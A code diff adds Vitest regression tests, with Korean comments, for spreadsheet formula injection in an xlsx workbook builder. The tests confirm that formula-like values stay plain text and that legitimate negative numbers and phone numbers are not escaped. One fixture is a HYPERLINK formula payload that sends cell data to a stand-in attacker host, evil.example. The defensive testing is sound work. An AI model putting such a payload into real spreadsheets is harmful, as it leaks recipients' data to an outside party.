@@ -132,3 +132,156 @@ describe('buildWorkbook — 시트명이 조사 연도를 따른다', () => {
     expect(wb.SheetNames).not.toContain('2026_필지선정');
   });
 });
+
+/**
+ * 수식 주입 — **현재는 도달 불가다. 그 상태를 못 박는다.**
+ *
+ * 업로드 파일의 셀 값이 `=`·`+`·`-`·`@`로 시작하면 CSV처럼 **타입이 없는** 형식에서는
+ * 열 때 수식으로 해석된다. 이 산출물은 담당자를 거쳐 흙토람 등 외부 기관으로 나가므로
+ * 그렇게 되면 문제가 크다.
+ *
+ * **그런데 xlsx 셀에는 타입이 있다.** 실측한 생성 XML:
+ *
+ * ```xml
+ * <c r="A2" t="str"><v>=HYPERLINK("http://evil.example","확인")</v></c>
+ * ```
+ *
+ * `<f>` 요소가 **없다.** OOXML에서 수식은 `<f>`에 담기고 `<v>`는 계산된 값일 뿐이라,
+ * Excel은 이것을 **텍스트로 표시하고 평가하지 않는다.** 코드베이스에 `f` 셀을 만드는
+ * 곳도, CSV로 내보내는 경로도 없다(`bookType`이 전부 `'xlsx'`).
+ *
+ * 그래서 **접두사를 이스케이프하지 않는다.** 했다면 `-1200` 같은 정상 값이 `'-1200`이
+ * 되어 담당자가 셀을 다시 손봐야 한다 — 없는 위험을 막으려고 산출물을 망가뜨리는 셈이다.
+ *
+ * ⚠️ **어떤 값이 걸리는지 정정한다.** 커밋 `4cbebbd`와 이 파일의 이전 주석은
+ * "`-1200`·`-`·`010-1234-5678`이 전부 걸린다"고 적었는데, `010-1234-5678`은
+ * **`0`으로 시작하므로 `/^[=+\-@]/`에 걸리지 않는다.** 이스케이프해도 멀쩡하다.
+ * 결론(이스케이프하지 말 것)은 그대로지만 근거로 든 예시가 틀렸다.
+ *
+ * 실제로 걸리는 정상 값은 **접두사가 `= + - @`인 것들**이다.
+ *
+ *   - `-1200`             음수 (면적·좌표 보정치)
+ *   - `-`                 빈칸 대용 대시
+ *   - `+82-10-1234-5678`  국제표기 전화번호 — 전화번호 중 **이것만** 걸린다
+ *   - `@`·`=`로 시작하는 품목명·비고 등 자유 입력
+ *
+ * 대신 **되돌아가는 것을 막는다.** 누가 CSV 내보내기를 붙이거나 수식 셀을 만들기
+ * 시작하면 그 순간 진짜 위험이 된다.
+ *
+ * **그 감시는 여기 있지 않다.** 아래 테스트들은 `buildWorkbook`까지만 부르고,
+ * 쓰기는 **테스트 헬퍼가 스스로** xlsx로 한다 — 프로덕션의 쓰기 경로를 한 번도
+ * 지나지 않는다. 2026-09-09 실측: `src/lib/excelExporter.ts`의 `bookType`을
+ * `'csv'`로 바꿔도 이 파일은 12/12 통과했다.
+ *
+ * 전제를 지키는 것은 `scripts/verify-export-format.mjs`다. `src/`의 모든 SheetJS
+ * 쓰기 호출이 `bookType: 'xlsx'`를 명시하는지, `sheet_to_csv`·`sheet_to_txt`로
+ * 빠져나가는 곳이 없는지를 **소스 수준에서** 본다. `npm run test`가 vitest 앞에
+ * 그것을 돌리므로 CI(test.yml·deploy.yml)와 로컬 양쪽에서 실제로 걸린다.
+ *
+ * 남는 경로 하나: 받는 사람이 그 셀을 **복사해 다른 시트에 붙여 넣으면** 수식이 된다.
+ * 사용자 조작이 필요하고 글자가 눈에 보이므로 여기서 막지 않는다.
+ */
+describe('buildWorkbook — 수식 주입', () => {
+  const FORMULA_LIKE = [
+    '=HYPERLINK("http://evil.example/leak?d="&A2,"확인")',
+    '+1+1',
+    '@SUM(A1)',
+    '=1+1',
+  ];
+
+  /** 워크북을 프로덕션과 같은 방식으로 써서 시트 XML을 꺼낸다 */
+  function sheetXml(wb: XLSX.WorkBook): string {
+    const buf = XLSX.write(wb, { bookType: 'xlsx', type: 'array' }) as ArrayBuffer;
+    // 다시 읽어 셀 객체를 본다 — f가 있으면 수식 셀이다
+    const back = XLSX.read(new Uint8Array(buf), { type: 'array', cellFormula: true });
+    return JSON.stringify(back.Sheets);
+  }
+
+  it('수식처럼 보이는 값이 수식 셀이 되지 않는다', () => {
+    const wb = build(FORMULA_LIKE.map((v, i) => both({ pnu: `P${i}`, address: v })));
+    const buf = XLSX.write(wb, { bookType: 'xlsx', type: 'array' }) as ArrayBuffer;
+    const back = XLSX.read(new Uint8Array(buf), { type: 'array', cellFormula: true });
+
+    for (const name of back.SheetNames) {
+      const sheet = back.Sheets[name];
+      for (const addr of Object.keys(sheet)) {
+        if (addr.startsWith('!')) continue;
+        // `f`가 있으면 Excel이 수식으로 실행한다
+        expect(sheet[addr].f).toBeUndefined();
+      }
+    }
+  });
+
+  it('수식처럼 보이는 값이 글자 그대로 보존된다', () => {
+    const wb = build([both({ pnu: 'P0', address: FORMULA_LIKE[0] })]);
+    const rows = cellsOf(wb, `${SURVEY_YEAR}_필지선정`);
+    const col = rows[0].indexOf('필지주소');
+    expect(rows[1][col]).toBe(FORMULA_LIKE[0]);
+  });
+
+  /**
+   * **이스케이프하지 않는다는 결정을 못 박는다.** 접두사를 무력화하면 이 값들이
+   * `'-1200` 처럼 되어 담당자가 손봐야 한다.
+   *
+   * **한 컬럼만 보면 안 된다.** 이전 판은 `필지주소` 한 칸만 봤다. 그런데
+   * 전화번호·품목명·지목은 `getRaw()`를 거쳐 흘러 들어오는 별개 경로라,
+   * 거기에만 과잉 방어가 붙어도 이 테스트는 통과했다. 행 전체를 단언한다.
+   */
+  it('음수·대시·국제표기 전화번호를 행 전체에 걸쳐 건드리지 않는다', () => {
+    // getRaw()가 흘려보내는 컬럼에 접두사 값을 심는다.
+    // `경영체주소`는 p.farmerAddress가 비어야 rawData로 폴백한다.
+    const rawData: Record<string, unknown> = {
+      '전화번호': '-1200',                  // `-` — 음수처럼 보이는 정상 값
+      '휴대전화번호': '+82-10-1234-5678',   // `+` — 전화번호 중 유일하게 걸리는 형태
+      '경영체주소': '010-1234-5678',        // `0` 시작 — 애초에 걸리지 않는다
+      '공부지목': '-',                      // 빈칸 대용 대시
+      '실제지목': '-0',
+      '품목명_대분류명': '-',
+      '품목명_중분류명': '@봉화농장',        // `@`
+      '품목명_소분류명': '=예비',            // `=`
+    };
+    const wb = build([both({ pnu: 'P0', address: '-1200', farmerAddress: '', rawData })]);
+
+    const rows = cellsOf(wb, `${SURVEY_YEAR}_필지선정`);
+    const [header, row] = rows;
+    const at = (name: string) => row[header.indexOf(name)];
+
+    expect(at('필지주소')).toBe('-1200');
+    expect(at('전화번호')).toBe('-1200');
+    expect(at('휴대전화번호')).toBe('+82-10-1234-5678');
+    expect(at('경영체주소')).toBe('010-1234-5678');
+    expect(at('공부지목')).toBe('-');
+    expect(at('실제지목')).toBe('-0');
+    expect(at('품목명_대분류명')).toBe('-');
+    expect(at('품목명_중분류명')).toBe('@봉화농장');
+    expect(at('품목명_소분류명')).toBe('=예비');
+
+    // 행 전체 — 어느 한 칸이라도 이스케이프되면 여기서 잡힌다
+    expect(row.filter((v) => typeof v === 'string' && v.startsWith("'"))).toEqual([]);
+  });
+
+  /** 시트 하나만 보면 `전체필지`·`제외필지` 쪽 과잉 방어를 놓친다. */
+  it('워크북 어느 시트에도 이스케이프된 셀이 없다', () => {
+    const wb = build([
+      both({ pnu: 'P0', address: '-1200', landCategoryOfficial: '-', landCategoryActual: '@전' }),
+      both({ pnu: 'P1', address: '+82-10-1234-5678' }),
+      both({ pnu: 'P2', address: '-' }),
+    ]);
+
+    const escaped: string[] = [];
+    for (const name of wb.SheetNames) {
+      for (const r of cellsOf(wb, name)) {
+        for (const v of r) {
+          if (typeof v === 'string' && v.startsWith("'")) escaped.push(`${name}: ${v}`);
+        }
+      }
+    }
+    expect(escaped).toEqual([]);
+  });
+
+  /** 그 XML에 수식 요소 자체가 없다 */
+  it('생성된 워크북에 수식 셀이 하나도 없다', () => {
+    const wb = build(FORMULA_LIKE.map((v, i) => both({ pnu: `P${i}`, address: v })));
+    expect(sheetXml(wb)).not.toContain('"f":');
+  });
+});
